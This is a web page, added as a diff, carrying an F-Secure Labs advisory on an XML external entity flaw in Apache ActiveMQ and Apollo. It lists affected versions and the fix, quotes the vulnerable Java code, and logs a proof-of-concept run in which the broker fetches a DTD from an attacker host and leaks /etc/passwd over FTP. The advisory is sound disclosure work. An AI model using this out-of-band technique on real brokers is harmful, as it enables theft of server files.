@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<meta name="x-subsite-id" content="1" />
+
+    <title>Apache ActiveMQ and ActiveMQ Apollo XML External Entity Data Parsing</title>
+
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">
+
+    <meta name="description" content="">
+    <link rel="canonical" href="https://labs.f-secure.com/advisories/apache-activemq-and-activemq-apollo-xml-external-entity-data-parsing/">
+    <meta name="robots" content="NOODP,index,follow">
+
+    
+
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+
+    <meta name="format-detection" content="telephone=no">
+    
+    <meta property="og:title" content="">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="F-Secure Labs">
+    <meta property="og:url" content="https://labs.f-secure.com/advisories/apache-activemq-and-activemq-apollo-xml-external-entity-data-parsing/">
+    
+    <meta property="og:locale" content='en_GB'>
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:title" content="">
+    <meta name="twitter:description" content="">
+
+  <script>
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
+    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
+    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
+    (window,document,'script','dataLayer','GTM-KD9T85H');
+  </script>
+  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
+<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
+</head>
+<body class="BlogPost" dir="ltr">
+
+    <header class="head menu-opened" id="top">
+	<div class="container">
+		<div class="col12">
+			<div class="logo">
+				<a href="/">F-Secure</a>
+			</div>
+		    <a href="/advisories/apache-activemq-and-activemq-apollo-xml-external-entity-data-parsing/#nav" class="btn-menu">Menu</a>
+
+<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
+    <ul>
+        
+            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
+        
+            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
+        
+            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
+        
+            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
+        
+            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
+        
+        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
+    </ul>
+</nav>
+
+		</div>
+	</div>
+</header>
+
+
+    <div class="wrapper">
+
+        <section class="section">
+  <div class="page-title">
+    <div class="container">
+      <span class="content-type"></span>
+      <h1>Apache ActiveMQ and ActiveMQ Apollo XML External Entity Data Parsing</h1>
+      
+      
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="col8">
+      <div class="blog-post">
+        
+        <table>
+          <tr>
+            <td>Product</td>
+            <td>ActiveMQ and ActiveMQ Apollo</td>
+          </tr>
+          <tr>
+            <td>Severity</td>
+            <td>Medium</td>
+          </tr>
+          <tr>
+            <td>CVE Reference</td>
+            <td>CVE-2014-3600, CVE-2014-3579</td>
+          </tr>
+          <tr>
+            <td>Type</td>
+            <td>XML External Entity Data Parsing</td>
+          </tr>
+        </table>
+        
+        <p>The Apache ActiveMQ and ActiveMQ Apollo messaging brokers are susceptible to <span class="caps">XML</span> external entities attacks when handling subscriptions with XPath based selectors.</p>
+<p>The advisory can be downloaded <a href="system/assets/887/original/Apache_ActiveMQ_and_ActiveMQ_Apollo_XML_External_Entity_Data_Parsing.pdf">here</a>.</p>
+<h3>Description:</h3>
+<p>Apache ActiveMQ is an open source message-oriented middleware messaging broker. ActiveMQ supports various message queueing protocols, such as Message Queue Telemetry Transport (<span class="caps">MQTT</span>), Advanced Message Queuing Protocol (<span class="caps">AMQP</span>), and Streaming Text Oriented Messaging Protocol (<span class="caps">STOMP</span>).</p>
+<p>A vulnerability was identified in ActiveMQ in the way it handles content-based subscriptions which allows an adversary to trigger processing of <span class="caps">XML</span> external entities (<span class="caps">XXE</span>). Apache ActiveMQ Apollo, which is another MQ implementation built for reliability and performance and originally based on ActiveMQ, was also found to be affected by this vulnerability.</p>
+<p>This vulnerability was found to affect Apache ActiveMQ versions 5.0.0 to 5.10.0 and Apache ActiveMQ Apollo 1.0 to 1.7.</p>
+<h3>Impact:</h3>
+<p>An attacker who is able to push and pull from a message queue can use this flaw to perform <span class="caps">DTD</span>-based DoS attacks, server-side request forgery or read local files, accessible to the user running the MQ broker, from the server.</p>
+<h3>Cause:</h3>
+<p><span class="caps">XML</span> parsing, as handled by ActiveMQ, does not restrict processing of <span class="caps">XML</span> external entities.</p>
+<h3>Solution:</h3>
+<p>If using ActiveMQ, upgrade to version 5.11.0 or later. For ActiveMQ Apollo, upgrade to version 1.7.1 or later.</p>
+<h3>Technical details:</h3>
+<p>MQ selectors allow for attaching a filter to a subscription when performing content based message routing. Apache ActiveMQ supports two types of MQ selectors. These are <span class="caps">JMS</span> selectors expressed in <span class="caps">SQL</span>-92 syntax for messages with message properties and XPath selectors for messages with <span class="caps">XML</span> bodies.</p>
+<p>It is possible for a consumer dequeuing <span class="caps">XML</span> messages to specify an XPath-based selector, thereby causing the broker to evaluate the XPath expression in an attempt to match it against the messages in the queue while also performing <span class="caps">XML</span> external entities resolution.</p>
+<p>In order to successfully exploit this vulnerability, an attacker has to act on behalf of both a publisher and a consumer. The following is an attack pattern which will result in triggering the <span class="caps">XXE</span> resolution:</p>
+<p>1. A publisher enqueues an <span class="caps">XML</span> message which references external <span class="caps">XML</span> entities.<br> 2. A consumer requests dequeuing an <span class="caps">XML</span> message from the same queue using an XPath-based selector.<br> 3. The broker evaluates the XPath expression and attempts to match it against the messages in the queue while also resolving any external entity references.</p>
+<p>The vulnerable code responsible for handling XPath based selectors is part of the org.apache.activemq.filter package which consists of two virtually identical classes, namely JAXPXPathEvaluator and XalanXPathEvaluator. The following is a snippet of the former where <span class="caps">XML</span> parsing occurs with processing of external entities:</p>
+<pre>package org.apache.activemq.filter;
+…
+public class JAXPXPathEvaluator implements XPathExpression.XPathEvaluator {
+    …
+    private boolean evaluate(byte[] data) {
+        try {
+            InputSource inputSource = new InputSource(new ByteArrayInputStream(data));
+            return ((Boolean)expression.evaluate(inputSource, XPathConstants.BOOLEAN)).booleanValue();
+        } catch (XPathExpressionException e) {
+            return false;
+        }
+    }
+
+    private boolean evaluate(String text) {
+        try {
+            InputSource inputSource = new InputSource(new StringReader(text));
+            return ((Boolean)expression.evaluate(inputSource, XPathConstants.BOOLEAN)).booleanValue();
+        } catch (XPathExpressionException e) {
+            return false;
+        }
+    }	
+    …</pre>
+<p>An adversary would need to set up an <span class="caps">HTTP</span> service hosting the external <span class="caps">DTD</span> and an <span class="caps">FTP</span> or other service to retrieve the file contents using an out-of-band technique. The following is the output from a successful attack using a Python script to simulate the <span class="caps">HTTP</span> and <span class="caps">FTP</span> services.</p>
+<p>1. Attack Execution</p>
+<pre>$ ./trigger.sh
+Building solution...
+[Producer] Creating connection...
+[Producer] Establishing session...
+[Producer] Publishing message...
+[Consumer] Creating connection...
+[Consumer] Establishing session...
+[Consumer] Consuming message...
+$</pre>
+<p>2. Out-of-Band File Retrieval</p>
+<pre>$ python multipurpose.py
+[HTTP] Service listening.
+[FTP] Service listening.
+[HTTP] Client established a connection...
+[HTTP] Dumping request.
+
+GET /external.dtd HTTP/1.1
+User-Agent: Java/1.6.0_31
+Host: 192.168.141.143:4444
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
+[HTTP] Serving our Document Type Definition.
+[HTTP] Closing connection.
+
+[FTP] Client established a connection...
+[FTP] Closing connection.
+[FTP] Dumping contents.
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+[SNIP]
+$</pre>
+<h3>Detailed Timeline</h3>
+<table><tbody><tr><td>Date</td>
+<td>Summary</td>
+</tr><tr><td>13/08/2014</td>
+<td>Reported to Apache</td>
+</tr><tr><td>13/08/2014</td>
+<td>Apache confirms reception</td>
+</tr><tr><td>15/08/2014</td>
+<td>Apache requests a proof of concept</td>
+</tr><tr><td>16/08/2014</td>
+<td><span class="caps">MWR</span> provides a proof of concept</td>
+</tr><tr><td>18/08/2014</td>
+<td>Apache confirms the vulnerability</td>
+</tr><tr><td>26/08/2014</td>
+<td>Apache suggests fix</td>
+</tr><tr><td>05/02/2015</td>
+<td>Public fix released</td>
+</tr><tr><td>06/03/2015</td>
+<td>Advisory published</td>
+</tr></tbody></table>
+      </div>
+      <div class="social-share">
+        <p><span class="content-type">Share</span></p>
+        <ul class="social">
+  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/apache-activemq-and-activemq-apollo-xml-external-entity-data-parsing/" target="_blank">Share on Facebook</a></li>
+  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/apache-activemq-and-activemq-apollo-xml-external-entity-data-parsing/&text=Apache ActiveMQ and ActiveMQ Apollo XML External Entity Data Parsing" target="_blank">Share on LinkedIn</a></li>
+  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/apache-activemq-and-activemq-apollo-xml-external-entity-data-parsing/&title=Apache ActiveMQ and ActiveMQ Apollo XML External Entity Data Parsing" target="_blank">Share on Twitter</a></li>
+</ul>
+
+      </div>
+    </div>
+    <div class="col4">
+      
+      <a href="/assets/BlogFiles/Apache-ActiveMQ-and-ActiveMQ-Apollo-XML-External-Entity-Data-Parsing.pdf" class="flex-container__box">
+            <span class="content-type">Download</span>
+            
+            <h3 class="flex-container__box-title">Download the advisory here.</h3>
+            
+      </a>
+      
+
+      
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="col12">
+        <p>&nbsp;</p>
+      </div>
+    </div>
+  </section>
+
+
+    </div>
+
+    <footer class="foot">
+	<div class="container">
+    <div class="footer-flex-wrap">
+     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
+      <ul class="top-menu">
+        <li><a href="/advisories/apache-activemq-and-activemq-apollo-xml-external-entity-data-parsing/#top" class="btn-gototop">Top</a></li>
+        
+        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
+        
+        
+      </ul>
+   </div>
+   <hr/>
+    <div class="col5 suf1 foot-about">
+      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
+    </div>
+    <div class="col3">
+      <ul class="footer-list no-margin">
+        
+        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
+        
+        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
+        
+        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
+        
+      </ul>
+    </div>
+    <div class="col3">
+     <ul class="footer-list">
+      
+      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
+      
+    </ul>
+  </div>
+</div>
+<div class="end">
+ <div class="container">
+  <hr/>
+  <div class="footer-flex-wrap">
+   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
+    <ul class="social">
+      
+      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
+      
+      
+      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
+      
+      
+      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
+      
+    </ul>
+ </div>
+</div>
+</div>
+</footer>
+
+    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>
+
+    
+    <script src="/themes/mwr/js/min/slides.min.js"></script>
+    
+
+    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>
+
+    <script type="application/ld+json">
+    { "@context" : "http://schema.org",
+      "@type" : "Organization",
+      "name" : "F-Secure Labs",
+      "url" : "https://labs.f-secure.com",
+      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
+      "sameAs" : [
+          "https://twitter.com/fsecurelabs",
+          "https://www.linkedin.com/showcase/28493188"],
+      "contactPoint" : [
+        { "@type" : "ContactPoint",
+          "telephone" : "+441256300920",
+          "contactType" : "customer service"
+        } ]
+    }
+    </script>
+</body>
+</html>
